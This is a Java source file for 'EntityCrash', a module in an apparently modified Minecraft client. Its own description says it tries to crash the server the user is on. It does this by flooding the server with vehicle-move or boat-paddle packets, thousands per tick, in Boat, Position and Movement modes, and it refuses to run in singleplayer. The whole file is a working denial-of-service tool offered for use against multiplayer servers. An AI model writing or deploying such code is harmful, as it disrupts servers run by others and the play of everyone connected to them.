package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.PlaySoundEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;

import static mathax.client.MatHax.LOG;

public class EntityCrash extends Module {

    private final Setting<Modes> mode;

    private final Setting<Double> speed;

    private final Setting<Integer> amount;

    private final Setting<Boolean> noSound;

    private final Setting<Boolean> leftPaddling;

    private final Setting<Boolean> rightPaddling;

    private final Setting<Boolean> autoDisable;

    public EntityCrash() {
        super(Categories.Crash, Items.PIG_SPAWN_EGG, "Entity Crash", "CRYSTAL || Tries to crash the server you are on by abusing entity packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());

        mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("the")
            .defaultValue(Modes.Position)
            .build());

        rightPaddling = sgGeneral.add(new BoolSetting.Builder()
            .name("Right Paddling")
            .description("Enable / disable left paddling.")
            .defaultValue(true)
            .visible(() -> mode.get() == Modes.Boat)
            .build());

        leftPaddling = sgGeneral.add(new BoolSetting.Builder()
            .name("Left Paddling")
            .description("Enable / disable left paddling.")
            .defaultValue(true)
            .visible(() -> mode.get() == Modes.Boat)
            .build());

        noSound = sgGeneral.add(new BoolSetting.Builder()
            .name("no-sound")
            .description("Blocks the paddle sounds.")
            .defaultValue(false)
            .visible(() -> mode.get() == Modes.Boat)
            .build());

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("Packets per tick")
            .defaultValue(2000)
            .sliderRange(100, 10000)
            .build());

        speed = sgGeneral.add(new DoubleSetting.Builder()
            .name("speed")
            .description("Speed in blocks per second.")
            .defaultValue(1337)
            .sliderRange(50, 10000)
            .visible(() -> mode.get() == Modes.Movement)
            .build());
    }

    @EventHandler
    public void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            if (mc.player == null) {
                error("Player is null, toggling.");
                toggle();
                return;
            } else if(mc.world == null) {
                error("World is null, toggling.");
                toggle();
                return;
            } else {
                Entity vehicle = mc.player.getVehicle();
                if (vehicle != null) {
                    Modes modes = mode.get();
                    if (Objects.requireNonNull(modes) != Modes.Boat) {
                        if (modes != Modes.Movement) {
                            if (modes == Modes.Position) {
                                BlockPos start = mc.player.getBlockPos();
                                Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
                                vehicle.updatePosition(end.x, end.y - 1, end.z);
                                int i = 0;
                                while (true) {
                                    if (i < amount.get()) {
                                        try {
                                            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new VehicleMoveC2SPacket(vehicle));
                                        } catch (NullPointerException NPE) {
                                            LOG.error("NullPointerException for EntityCrash Position: ", NPE);
                                        }

                                        i++;
                                    } else {
                                        break;
                                    }
                                }
                            }
                        } else {
                            int i = 0;
                            while (true) {
                                if (i < amount.get()) {
                                    Vec3d v = vehicle.getPos();
                                    vehicle.setPos(v.x, v.y + speed.get(), v.z);
                                    try {
                                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new VehicleMoveC2SPacket(vehicle));
                                    } catch (NullPointerException NPE) {
                                        LOG.error("NullPointerException for EntityCrash Movement: ", NPE);
                                    }
                                    i++;
                                } else {
                                    break;
                                }
                            }
                        }
                    } else {
                        if (vehicle instanceof BoatEntity) {
                        } else {
                            error("You must be in a boat, toggling");
                            toggle();
                        }
                        int i = 0;
                        while (true) {
                            if (i >= amount.get()) {
                                break;
                            } else {
                                try {
                                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new BoatPaddleStateC2SPacket(leftPaddling.get(), rightPaddling.get()));
                                } catch (NullPointerException NPE) {
                                    LOG.error("NullPointerException for EntityCrash Boat: ", NPE);
                                }

                                i++;
                            }
                        }
                    }
                } else {
                    error("You must be riding an entity, toggling.");
                    toggle();
                    return;
                }

            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if ((!noSound.get() || !event.sound.getId().toString().equals("minecraft:entity.boat.paddle_land")) && !event.sound.getId().toString().equals("minecraft:entity.boat.paddle_water")) {
            return;
        }
        event.cancel();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public enum Modes {
        Boat, Position, Movement
    }
}
